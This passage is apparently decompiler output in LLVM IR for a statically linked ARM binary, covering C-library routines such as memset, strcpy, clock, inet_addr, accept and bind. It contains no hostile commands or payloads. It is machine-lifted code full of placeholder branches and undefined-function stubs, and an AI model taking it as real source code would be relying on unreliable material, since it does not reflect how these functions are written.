  %v3_112b8 = inttoptr i32 %v2_112b8 to i32*
  %v4_112b8 = load i32, i32* %v3_112b8, align 4
  store i32 %v4_112b8, i32* @ip, align 4
  store i32 70340, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_112b8)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_112c8

dec_label_pc_112c8:                               ; preds = %dec_label_pc_112f8, %entry
  %v0_112c8 = load i32, i32* @r5, align 4
  %v1_112c8 = add i32 %v0_112c8, 4
  %v2_112c8 = inttoptr i32 %v1_112c8 to i32*
  %v3_112c8 = load i32, i32* %v2_112c8, align 4
  store i32 %v3_112c8, i32* %r2.global-to-local, align 4
  %v4_112c8 = add i32 %v0_112c8, 8
  %v5_112c8 = inttoptr i32 %v4_112c8 to i32*
  %v6_112c8 = load i32, i32* %v5_112c8, align 4
  %tmp10 = icmp ugt i32 %v6_112c8, %v3_112c8
  br i1 %tmp10, label %dec_label_pc_112f8, label %dec_label_pc_112d4

dec_label_pc_112d4:                               ; preds = %dec_label_pc_112c8
  %v1_112d4 = inttoptr i32 %v0_112c8 to i32*
  %v2_112d4 = load i32, i32* %v1_112d4, align 4
  %v1_112d8 = add i32 %v0_112c8, 12
  %v2_112d8 = inttoptr i32 %v1_112d8 to i32*
  %v3_112d8 = load i32, i32* %v2_112d8, align 4
  store i32 %v3_112d8, i32* %r1.global-to-local, align 4
  %v1_112dc = add i32 %v0_112c8, 20
  %v2_112dc = inttoptr i32 %v1_112dc to i32*
  %v3_112dc = load i32, i32* %v2_112dc, align 4
  store i32 %v3_112dc, i32* %r2.global-to-local, align 4
  %v4_112e0 = call i32 @__getdents(i32 %v2_112d4, i32 %v3_112d8, i32 %v3_112dc, i32 %v6_112c8)
  %tmp9 = icmp slt i32 %v4_112e0, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_112f0

.thread:                                          ; preds = %dec_label_pc_112d4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_11324

dec_label_pc_112f0:                               ; preds = %dec_label_pc_112d4
  %v1_112f0 = load i32, i32* @r5, align 4
  %v2_112f0 = add i32 %v1_112f0, 8
  %v3_112f0 = inttoptr i32 %v2_112f0 to i32*
  store i32 %v4_112e0, i32* %v3_112f0, align 4
  %v0_112f4 = load i32, i32* @r7, align 4
  %v1_112f4 = load i32, i32* @r5, align 4
  %v2_112f4 = add i32 %v1_112f4, 4
  %v3_112f4 = inttoptr i32 %v2_112f4 to i32*
  store i32 %v0_112f4, i32* %v3_112f4, align 4
  %v0_112f8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_112f8

dec_label_pc_112f8:                               ; preds = %dec_label_pc_112c8, %dec_label_pc_112f0
  %v1_11308 = phi i32 [ %v0_112c8, %dec_label_pc_112c8 ], [ %v0_112f8.pre, %dec_label_pc_112f0 ]
  %v1_112f8 = add i32 %v1_11308, 4
  %v2_112f8 = inttoptr i32 %v1_112f8 to i32*
  %v3_112f8 = load i32, i32* %v2_112f8, align 4
  store i32 %v3_112f8, i32* %r2.global-to-local, align 4
  %v1_112fc = add i32 %v1_11308, 12
  %v2_112fc = inttoptr i32 %v1_112fc to i32*
  %v3_112fc = load i32, i32* %v2_112fc, align 4
  store i32 %v3_112fc, i32* %r1.global-to-local, align 4
  %v2_11300 = add i32 %v3_112fc, %v3_112f8
  store i32 %v2_11300, i32* @r4, align 4
  %v1_11304 = add i32 %v2_11300, 4
  %v2_11304 = inttoptr i32 %v1_11304 to i32*
  %v3_11304 = load i32, i32* %v2_11304, align 4
  %v2_11308 = add i32 %v1_11308, 16
  %v3_11308 = inttoptr i32 %v2_11308 to i32*
  store i32 %v3_11304, i32* %v3_11308, align 4
  %v0_1130c = load i32, i32* @r4, align 4
  %v1_1130c = add i32 %v0_1130c, 8
  %v2_1130c = inttoptr i32 %v1_1130c to i16*
  %v3_1130c = load i16, i16* %v2_1130c, align 2
  %v4_1130c = zext i16 %v3_1130c to i32
  %v0_11310 = load i32, i32* %r2.global-to-local, align 4
  %v1_11310 = load i32, i32* %r1.global-to-local, align 4
  %v2_11310 = add i32 %v1_11310, %v0_11310
  %v3_11310 = inttoptr i32 %v2_11310 to i32*
  %v4_11310 = load i32, i32* %v3_11310, align 4
  store i32 %v4_11310, i32* %r1.global-to-local, align 4
  %v2_11314 = add i32 %v0_11310, %v4_1130c
  %v2_11318 = icmp eq i32 %v4_11310, 0
  %v1_1131c = load i32, i32* @r5, align 4
  %v2_1131c = add i32 %v1_1131c, 4
  %v3_1131c = inttoptr i32 %v2_1131c to i32*
  store i32 %v2_11314, i32* %v3_1131c, align 4
  br i1 %v2_11318, label %dec_label_pc_112c8, label %dec_label_pc_11324

dec_label_pc_11324:                               ; preds = %dec_label_pc_112f8, %.thread
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_11330 = load i32, i32* @r6, align 4
  %v2_11330 = add i32 %v0_11330, 44
  %v3_11330 = inttoptr i32 %v2_11330 to i32*
  %v4_11330 = load i32, i32* %v3_11330, align 4
  call void @__pseudo_branch(i32 %v4_11330)
  %v0_1133c = load i32, i32* @r4, align 4
  store i32 %v3_11278, i32* @r4, align 4
  store i32 %v6_11278, i32* @r5, align 4
  store i32 %v9_11278, i32* @r6, align 4
  store i32 %v12_11278, i32* @r7, align 4
  store i32 %v15_11278, i32* @lr, align 4
  ret i32 %v0_1133c

; uselistorder directives
  uselistorder i32 %v1_11308, { 0, 2, 1 }
  uselistorder i32 %v6_112c8, { 1, 0 }
  uselistorder i32 %v0_112c8, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_112f8, { 1, 0 }
}

define i32 @function_11350(i32 %arg1) local_unnamed_addr {
dec_label_pc_11350:
  %v0_11350 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11350, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_11350
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_11350, %bb
  %v4_1135c = phi i32 [ %arg1, %dec_label_pc_11350 ], [ 0, %bb ]
  ret i32 %v4_1135c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  %v0_11360 = load i32, i32* @lr, align 4
  %v0_11368 = call i32 @__aeabi_read_tp()
  %v3_1136c = load i16, i16* @global_var_21a48.352, align 2
  %v4_1136c = sext i16 %v3_1136c to i32
  %v2_11370 = add i32 %v4_1136c, %v0_11368
  store i32 %v0_11360, i32* @lr, align 4
  ret i32 %v2_11370
}

define i32 @clock(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_11384 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_11384, i32* @r0, align 4
  %v1_1138c = call i32 @times(i32 %v2_11384)
  %v2_11390 = load i32, i32* %stack_var_-24, align 4
  %v2_11394 = add i32 %v2_11390, %tmp
  %v2_1139c = mul i32 %v2_11394, 10000
  %v1_113a0 = and i32 %v2_1139c, 2147483632
  ret i32 %v1_113a0

; uselistorder directives
  uselistorder i32 %v2_11384, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_113c0 = call i32 @_memcpy()
  ret i32 %v0_113c0
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_113d0 = call i32 @_memcpy()
  ret i32 %v0_113d0

; uselistorder directives
  uselistorder i32 ()* @_memcpy, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v8_113e4 = icmp eq i32 %arg3, 8
  store i1 %v8_113e4, i1* %cpsr_z.global-to-local, align 1
  %v5_113e8 = icmp slt i32 %arg3, 8
  br i1 %v5_113e8, label %dec_label_pc_11448, label %dec_label_pc_113ec

dec_label_pc_113ec:                               ; preds = %entry
  %v4_113ec = mul i32 %arg2, 256
  %v5_113ec = or i32 %v4_113ec, %arg2
  %v4_113f0 = mul i32 %v5_113ec, 65536
  %v5_113f0 = or i32 %v4_113f0, %v5_113ec
  store i32 %v5_113f0, i32* @r1, align 4
  %v1_113f457 = urem i32 %tmp, 4
  %v2_113f458 = icmp eq i32 %v1_113f457, 0
  store i1 %v2_113f458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_113f458, label %dec_label_pc_11404, label %bb

bb:                                               ; preds = %dec_label_pc_113ec, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_113ec ]
  %v3_113f859 = phi i32 [ %v6_113f8, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_113ec ]
  %v4_113f8 = inttoptr i32 %v3_113f859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_113f8, align 1
  %v5_113f8 = load i32, i32* @r3, align 4
  %v6_113f8 = add i32 %v5_113f8, 1
  store i32 %v6_113f8, i32* @r3, align 4
  %v0_113fc.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_11408.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_113fc.pr, label %dec_label_pc_11404, label %.thread

.thread:                                          ; preds = %bb
  %v2_113fc = add i32 %v0_11408.pr.pre, -1
  store i32 %v2_113fc, i32* %r2.global-to-local, align 4
  %v1_113f4 = urem i32 %v6_113f8, 4
  %v2_113f4 = icmp eq i32 %v1_113f4, 0
  store i1 %v2_113f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_113f4, label %dec_label_pc_11404, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_113f8.pre = load i32, i32* @r1, align 4
  %extract.t82 = trunc i32 %v1_113f8.pre to i8
  br label %bb

dec_label_pc_11404:                               ; preds = %.thread, %bb, %dec_label_pc_113ec
  %v0_1141028 = phi i32 [ %tmp, %dec_label_pc_113ec ], [ %v6_113f8, %bb ], [ %v6_113f8, %.thread ]
  %v0_11408.pr = phi i32 [ %arg3, %dec_label_pc_113ec ], [ %v0_11408.pr.pre, %bb ], [ %v2_113fc, %.thread ]
  %v0_11404 = load i32, i32* @r1, align 4
  store i32 %v0_11404, i32* %ip.global-to-local, align 4
  %v8_1140810 = icmp eq i32 %v0_11408.pr, 8
  store i1 %v8_1140810, i1* %cpsr_z.global-to-local, align 1
  %v5_1140c11 = icmp slt i32 %v0_11408.pr, 8
  br i1 %v5_1140c11, label %dec_label_pc_11448, label %dec_label_pc_11410.preheader

dec_label_pc_11410.preheader:                     ; preds = %dec_label_pc_11404
  %v1_1141046 = inttoptr i32 %v0_1141028 to i32*
  store i32 %v0_11404, i32* %v1_1141046, align 4
  %v3_1141047 = add i32 %v0_1141028, 4
  %v4_1141048 = inttoptr i32 %v3_1141047 to i32*
  %v5_1141049 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_1141049, i32* %v4_1141048, align 4
  %v6_1141050 = add i32 %v0_1141028, 8
  store i32 %v6_1141050, i32* @r3, align 4
  %v0_1141451 = load i32, i32* %r2.global-to-local, align 4
  %v1_1141452 = add i32 %v0_1141451, -8
  store i32 %v1_1141452, i32* %r2.global-to-local, align 4
  %v5_1141c53 = icmp slt i32 %v1_1141452, 8
  br i1 %v5_1141c53, label %dec_label_pc_11410.dec_label_pc_11448.loopexit_crit_edge, label %dec_label_pc_11420

dec_label_pc_11420:                               ; preds = %dec_label_pc_11410.preheader, %dec_label_pc_11408.dec_label_pc_11410_crit_edge
  %v6_1141055 = phi i32 [ %v6_11410, %dec_label_pc_11408.dec_label_pc_11410_crit_edge ], [ %v6_1141050, %dec_label_pc_11410.preheader ]
  %v0_1141054 = phi i32 [ %v12_1143c, %dec_label_pc_11408.dec_label_pc_11410_crit_edge ], [ %v0_1141028, %dec_label_pc_11410.preheader ]
  %v1_11420 = inttoptr i32 %v6_1141055 to i32*
  %v2_11420 = load i32, i32* @r1, align 4
  store i32 %v2_11420, i32* %v1_11420, align 4
  %v3_11420 = add i32 %v0_1141054, 12
  %v4_11420 = inttoptr i32 %v3_11420 to i32*
  %v5_11420 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11420, i32* %v4_11420, align 4
  %v6_11420 = add i32 %v0_1141054, 16
  store i32 %v6_11420, i32* @r3, align 4
  %v0_11424 = load i32, i32* %r2.global-to-local, align 4
  %v1_11424 = add i32 %v0_11424, -8
  store i32 %v1_11424, i32* %r2.global-to-local, align 4
  %v5_1142c = icmp slt i32 %v1_11424, 8
  br i1 %v5_1142c, label %dec_label_pc_11420.dec_label_pc_11448.loopexit_crit_edge, label %dec_label_pc_11430

dec_label_pc_11430:                               ; preds = %dec_label_pc_11420
  %v1_11430 = inttoptr i32 %v6_11420 to i32*
  %v2_11430 = load i32, i32* @r1, align 4
  store i32 %v2_11430, i32* %v1_11430, align 4
  %v3_11430 = add i32 %v0_1141054, 20
  %v4_11430 = inttoptr i32 %v3_11430 to i32*
  %v5_11430 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11430, i32* %v4_11430, align 4
  %v6_11430 = add i32 %v0_1141054, 24
  store i32 %v6_11430, i32* @r3, align 4
  %v0_11434 = load i32, i32* %r2.global-to-local, align 4
  %v1_11434 = add i32 %v0_11434, -8
  store i32 %v1_11434, i32* %r2.global-to-local, align 4
  %v5_1143c = icmp slt i32 %v1_11434, 8
  br i1 %v5_1143c, label %dec_label_pc_11430.dec_label_pc_11448.loopexit_crit_edge, label %dec_label_pc_11408

dec_label_pc_11408:                               ; preds = %dec_label_pc_11430
  %v7_1143c = inttoptr i32 %v6_11430 to i32*
  %v8_1143c = load i32, i32* @r1, align 4
  store i32 %v8_1143c, i32* %v7_1143c, align 4
  %v9_1143c = add i32 %v0_1141054, 28
  %v10_1143c = inttoptr i32 %v9_1143c to i32*
  %v11_1143c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_1143c, i32* %v10_1143c, align 4
  %v12_1143c = add i32 %v0_1141054, 32
  store i32 %v12_1143c, i32* @r3, align 4
  %v6_11440 = load i32, i32* %r2.global-to-local, align 4
  %v7_11440 = add i32 %v6_11440, -8
  store i32 %v7_11440, i32* %r2.global-to-local, align 4
  %v5_1140c = icmp slt i32 %v7_11440, 8
  br i1 %v5_1140c, label %dec_label_pc_11408.dec_label_pc_11448.loopexit_crit_edge, label %dec_label_pc_11408.dec_label_pc_11410_crit_edge

dec_label_pc_11408.dec_label_pc_11410_crit_edge:  ; preds = %dec_label_pc_11408
  %v2_11410.pre = load i32, i32* @r1, align 4
  %v1_11410 = inttoptr i32 %v12_1143c to i32*
  store i32 %v2_11410.pre, i32* %v1_11410, align 4
  %v3_11410 = add i32 %v0_1141054, 36
  %v4_11410 = inttoptr i32 %v3_11410 to i32*
  %v5_11410 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11410, i32* %v4_11410, align 4
  %v6_11410 = add i32 %v0_1141054, 40
  store i32 %v6_11410, i32* @r3, align 4
  %v0_11414 = load i32, i32* %r2.global-to-local, align 4
  %v1_11414 = add i32 %v0_11414, -8
  store i32 %v1_11414, i32* %r2.global-to-local, align 4
  %v5_1141c = icmp slt i32 %v1_11414, 8
  br i1 %v5_1141c, label %dec_label_pc_11410.dec_label_pc_11448.loopexit_crit_edge, label %dec_label_pc_11420

dec_label_pc_11408.dec_label_pc_11448.loopexit_crit_edge: ; preds = %dec_label_pc_11408
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11448

dec_label_pc_11410.dec_label_pc_11448.loopexit_crit_edge: ; preds = %dec_label_pc_11408.dec_label_pc_11410_crit_edge, %dec_label_pc_11410.preheader
  %v1_11414.lcssa = phi i32 [ %v1_1141452, %dec_label_pc_11410.preheader ], [ %v1_11414, %dec_label_pc_11408.dec_label_pc_11410_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11448

dec_label_pc_11420.dec_label_pc_11448.loopexit_crit_edge: ; preds = %dec_label_pc_11420
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11448

dec_label_pc_11430.dec_label_pc_11448.loopexit_crit_edge: ; preds = %dec_label_pc_11430
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11448

dec_label_pc_11448:                               ; preds = %dec_label_pc_11404, %dec_label_pc_11408.dec_label_pc_11448.loopexit_crit_edge, %dec_label_pc_11410.dec_label_pc_11448.loopexit_crit_edge, %dec_label_pc_11420.dec_label_pc_11448.loopexit_crit_edge, %dec_label_pc_11430.dec_label_pc_11448.loopexit_crit_edge, %entry
  %v0_11450 = phi i32 [ %arg3, %entry ], [ %v1_11434, %dec_label_pc_11430.dec_label_pc_11448.loopexit_crit_edge ], [ %v1_11424, %dec_label_pc_11420.dec_label_pc_11448.loopexit_crit_edge ], [ %v1_11414.lcssa, %dec_label_pc_11410.dec_label_pc_11448.loopexit_crit_edge ], [ %v7_11440, %dec_label_pc_11408.dec_label_pc_11448.loopexit_crit_edge ], [ %v0_11408.pr, %dec_label_pc_11404 ]
  %v2_11448 = icmp eq i32 %v0_11450, 0
  store i1 %v2_11448, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11448, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_11448
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_11448
  %v1_11450 = sub i32 7, %v0_11450
  store i32 %v1_11450, i32* %r2.global-to-local, align 4
  %v3_11454 = mul i32 %v1_11450, 4
  %v4_11454 = add i32 %v3_11454, ptrtoint (i32* @global_var_1145c.395 to i32)
  call void @__pseudo_branch(i32 %v4_11454)
  %v0_1145c = load i32, i32* @r1, align 4
  %v1_1145c = trunc i32 %v0_1145c to i8
  %v2_1145c = load i32, i32* @r3, align 4
  %v3_1145c = inttoptr i32 %v2_1145c to i8*
  store i8 %v1_1145c, i8* %v3_1145c, align 1
  %v4_1145c = load i32, i32* @r3, align 4
  %v5_1145c = add i32 %v4_1145c, 1
  store i32 %v5_1145c, i32* %r3.global-to-local, align 4
  %v0_11460 = load i32, i32* @r1, align 4
  %v1_11460 = trunc i32 %v0_11460 to i8
  %v3_11460 = inttoptr i32 %v5_1145c to i8*
  store i8 %v1_11460, i8* %v3_11460, align 1
  %v4_11460 = load i32, i32* %r3.global-to-local, align 4
  %v5_11460 = add i32 %v4_11460, 1
  store i32 %v5_11460, i32* %r3.global-to-local, align 4
  %v0_11464 = load i32, i32* @r1, align 4
  %v1_11464 = trunc i32 %v0_11464 to i8
  %v3_11464 = inttoptr i32 %v5_11460 to i8*
  store i8 %v1_11464, i8* %v3_11464, align 1
  %v4_11464 = load i32, i32* %r3.global-to-local, align 4
  %v5_11464 = add i32 %v4_11464, 1
  store i32 %v5_11464, i32* %r3.global-to-local, align 4
  %v0_11468 = load i32, i32* @r1, align 4
  %v1_11468 = trunc i32 %v0_11468 to i8
  %v3_11468 = inttoptr i32 %v5_11464 to i8*
  store i8 %v1_11468, i8* %v3_11468, align 1
  %v4_11468 = load i32, i32* %r3.global-to-local, align 4
  %v5_11468 = add i32 %v4_11468, 1
  store i32 %v5_11468, i32* %r3.global-to-local, align 4
  %v0_1146c = load i32, i32* @r1, align 4
  %v1_1146c = trunc i32 %v0_1146c to i8
  %v3_1146c = inttoptr i32 %v5_11468 to i8*
  store i8 %v1_1146c, i8* %v3_1146c, align 1
  %v4_1146c = load i32, i32* %r3.global-to-local, align 4
  %v5_1146c = add i32 %v4_1146c, 1
  store i32 %v5_1146c, i32* %r3.global-to-local, align 4
  %v0_11470 = load i32, i32* @r1, align 4
  %v1_11470 = trunc i32 %v0_11470 to i8
  %v3_11470 = inttoptr i32 %v5_1146c to i8*
  store i8 %v1_11470, i8* %v3_11470, align 1
  %v4_11470 = load i32, i32* %r3.global-to-local, align 4
  %v5_11470 = add i32 %v4_11470, 1
  store i32 %v5_11470, i32* %r3.global-to-local, align 4
  %v0_11474 = load i32, i32* @r1, align 4
  %v1_11474 = trunc i32 %v0_11474 to i8
  %v3_11474 = inttoptr i32 %v5_11470 to i8*
  store i8 %v1_11474, i8* %v3_11474, align 1
  %v4_11474 = load i32, i32* %r3.global-to-local, align 4
  %v5_11474 = add i32 %v4_11474, 1
  store i32 %v5_11474, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_11410, { 1, 0 }
  uselistorder i32 %v12_1143c, { 1, 2, 0 }
  uselistorder i32 %v0_1141054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_11408.pr, { 0, 2, 1 }
  uselistorder i32 %v6_113f8, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_113ec, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 10, 3, 4, 5, 6, 7, 8, 9, 1, 12, 13, 11, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 2, 1, 0, 3, 4, 9, 8, 5, 7 }
  uselistorder i32 %arg3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_11448, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_11420, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_114901 = load i32, i32* @r1, align 4
  %v1_114902 = inttoptr i32 %v0_114901 to i8*
  %v2_114903 = load i8, i8* %v1_114902, align 1
  %v2_114945 = icmp eq i8 %v2_114903, 0
  store i1 %v2_114945, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_114903, i8* %arg1, align 1
  br i1 %v2_114945, label %dec_label_pc_114a0, label %dec_label_pc_11488

dec_label_pc_11488:                               ; preds = %entry, %dec_label_pc_11488
  %v0_11488 = load i32, i32* @r1, align 4
  %v1_11488 = add i32 %v0_11488, 1
  store i32 %v1_11488, i32* @r1, align 4
  %v0_1148c = load i32, i32* %r2.global-to-local, align 4
  %v1_1148c = add i32 %v0_1148c, 1
  store i32 %v1_1148c, i32* %r2.global-to-local, align 4
  %v1_11490 = inttoptr i32 %v1_11488 to i8*
  %v2_11490 = load i8, i8* %v1_11490, align 1
  %v2_11494 = icmp eq i8 %v2_11490, 0
  store i1 %v2_11494, i1* %cpsr_z.global-to-local, align 1
  %v3_11498 = inttoptr i32 %v1_1148c to i8*
  store i8 %v2_11490, i8* %v3_11498, align 1
  %v0_1149c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1149c, label %dec_label_pc_114a0, label %dec_label_pc_11488

dec_label_pc_114a0:                               ; preds = %dec_label_pc_11488, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_11488, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_114ac = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_114ac, i32* @r1, align 4
  %v0_114b0 = call i32 @inet_aton()
  %v2_114b4 = icmp eq i32 %v0_114b0, 0
  %v4_114b8 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_114b4, i32 -1, i32 %v4_114b8
  ret i32 %storemerge
}

define i32 @__sys_accept() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_114cc = load i32, i32* @r7, align 4
  store i32 %v3_114cc, i32* %stack_var_-8, align 4
  %v0_114d8 = load i32, i32* @r0, align 4
  store i32 %v0_114d8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_114d8, -4095
  br i1 %tmp, label %dec_label_pc_11500, label %dec_label_pc_114e8

dec_label_pc_114e8:                               ; preds = %entry
  %v0_114ec = call i32 @__aeabi_read_tp()
  %v3_114f0 = load i16, i16* @global_var_21a48.352, align 2
  %v4_114f0 = sext i16 %v3_114f0 to i32
  %v0_114f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_114f4 = sub i32 0, %v0_114f4
  store i32 %v1_114f4, i32* %r2.global-to-local, align 4
  %v3_114f8 = add i32 %v4_114f0, %v0_114ec
  %v4_114f8 = inttoptr i32 %v3_114f8 to i32*
  store i32 %v1_114f4, i32* %v4_114f8, align 4
  %v2_11500.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11500

dec_label_pc_11500:                               ; preds = %entry, %dec_label_pc_114e8
  %v1_11504 = phi i32 [ %v0_114d8, %entry ], [ -1, %dec_label_pc_114e8 ]
  %v2_11500 = phi i32 [ %v3_114cc, %entry ], [ %v2_11500.pre, %dec_label_pc_114e8 ]
  store i32 %v2_11500, i32* @r7, align 4
  ret i32 %v1_11504

; uselistorder directives
  uselistorder i32 %v0_114d8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11500, { 1, 0 }
}

define i32 @"$d.9"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11508:
  %v0_11508 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11508, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11508
  %v2_11508 = load i32, i32* @sp, align 4
  %v8_11508 = shl i32 %v2_11508, %arg2
  %v9_11508 = and i32 %v8_11508, %arg1
  %v3_1150c = load i32, i32* @r5, align 4
  %v8_1150c = ashr i32 %v9_11508, %v3_1150c
  %v9_1150c = and i32 %v8_1150c, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11508, %bb
  %v10_1150c = phi i32 [ %arg1, %dec_label_pc_11508 ], [ %v9_1150c, %bb ]
  ret i32 %v10_1150c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v3_11514 = load i32, i32* @r4, align 4
  %v9_11514 = load i32, i32* @r6, align 4
  %v12_11514 = load i32, i32* @r7, align 4
  %v4_11520 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 12800) to i32*), align 4
  %v2_11524 = icmp eq i32 %v4_11520, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_11524, label %dec_label_pc_1153c, label %entry.dec_label_pc_11548_crit_edge

entry.dec_label_pc_11548_crit_edge:               ; preds = %entry
  br label %dec_label_pc_11548

dec_label_pc_1153c:                               ; preds = %entry
  store i32 %v3_11514, i32* @r4, align 4
  store i32 %v9_11514, i32* @r6, align 4
  store i32 %v12_11514, i32* @r7, align 4
  %v0_11544 = call i32 @__sys_accept()
  br label %dec_label_pc_11548

dec_label_pc_11548:                               ; preds = %entry.dec_label_pc_11548_crit_edge, %dec_label_pc_1153c
  %v0_11548 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_11548, i32* @r5, align 4
  %v0_11558 = load i32, i32* @r4, align 4
  store i32 %v0_11558, i32* @r0, align 4
  %v0_1155c = call i32 @__sys_accept()
  store i32 %v0_1155c, i32* @r4, align 4
  %v0_11564 = load i32, i32* @r5, align 4
  %v1_11568 = call i32 @__libc_disable_asynccancel(i32 %v0_11564)
  %v0_1156c = load i32, i32* @r4, align 4
  store i32 %v12_11514, i32* @r7, align 4
  ret i32 %v0_1156c

; uselistorder directives
  uselistorder label %dec_label_pc_11548, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11584 = load i32, i32* @r7, align 4
  store i32 %v3_11584, i32* %stack_var_-8, align 4
  %v0_11590 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11590, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11590, -4095
  br i1 %tmp, label %dec_label_pc_115b8, label %dec_label_pc_115a0

dec_label_pc_115a0:                               ; preds = %entry
  %v0_115a4 = call i32 @__aeabi_read_tp()
  %v3_115a8 = load i16, i16* @global_var_21a48.352, align 2
  %v4_115a8 = sext i16 %v3_115a8 to i32
  %v0_115ac = load i32, i32* %r2.global-to-local, align 4
  %v1_115ac = sub i32 0, %v0_115ac
  store i32 %v1_115ac, i32* %r2.global-to-local, align 4
  %v3_115b0 = add i32 %v4_115a8, %v0_115a4
  %v4_115b0 = inttoptr i32 %v3_115b0 to i32*
  store i32 %v1_115ac, i32* %v4_115b0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_115b8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_115b8

dec_label_pc_115b8:                               ; preds = %entry, %dec_label_pc_115a0
